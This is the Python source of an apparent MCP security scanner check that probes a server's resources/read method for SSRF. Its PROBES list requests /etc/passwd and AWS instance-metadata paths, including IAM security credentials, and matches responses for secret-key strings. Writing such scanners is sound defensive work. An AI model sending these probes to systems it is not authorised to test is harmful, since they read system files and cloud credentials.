from __future__ import annotations
import aiohttp
from mcpmap.models import Server, Finding, Severity, Confidence, Evidence
from mcpmap.audit.base import BaseCheck
from mcpmap.audit.check_ids import by_id

_REC = by_id("MCP-RES-SSRF")

# Each probe: (uri, body_fingerprints).
# A finding fires only if the response body contains AT LEAST ONE of the fingerprints —
# things only the real upstream would emit, not strings the URI itself might echo.
PROBES = [
    ("file:///etc/passwd", ["root:x:0:0"]),
    ("file:///etc/hostname", []),                   # no fingerprint — only fires if status==200 & non-empty content
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "iam/"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
]


class Ssrf001ResourcesRead(BaseCheck):
    id = _REC.canonical_id
    intrusive = True

    async def run(self, server: Server) -> Finding | None:
        timeout = aiohttp.ClientTimeout(total=10.0)
        hits: list[dict] = []
        async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(ssl=False)) as session:
            for uri, fingerprints in PROBES:
                body = {"jsonrpc": "2.0", "id": 1, "method": "resources/read", "params": {"uri": uri}}
                try:
                    async with session.post(server.url, json=body, headers={"Accept": "application/json, text/event-stream"}) as r:
                        text = await r.text()
                except aiohttp.ClientError:
                    continue
                if r.status != 200 or '"result"' not in text:
                    continue
                # Strip the echoed URI before fingerprint-matching so an echo doesn't false-positive.
                body_only = text.replace(uri, "")
                if not fingerprints:
                    # No fingerprint defined → require non-trivial body (>200 bytes after stripping the URI echo).
                    if len(body_only) > 200:
                        hits.append({"uri": uri, "response_excerpt": text[:512]})
                else:
                    if any(fp in body_only for fp in fingerprints):
                        hits.append({"uri": uri, "matched_fingerprints": [fp for fp in fingerprints if fp in body_only], "response_excerpt": text[:512]})
        if not hits:
            return None
        return Finding(
            check=self.id,
            aliases=list(_REC.legacy_aliases),
            severity=Severity(_REC.default_severity),
            confidence=Confidence(_REC.default_confidence),
            cwe=_REC.cwe or None,
            cvss=8.6,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
            title=_REC.title,
            evidence=Evidence(
                artifacts={"hits": hits},
            ),
            repro="Replay any hit URI via tools/call resources/read.",
        )
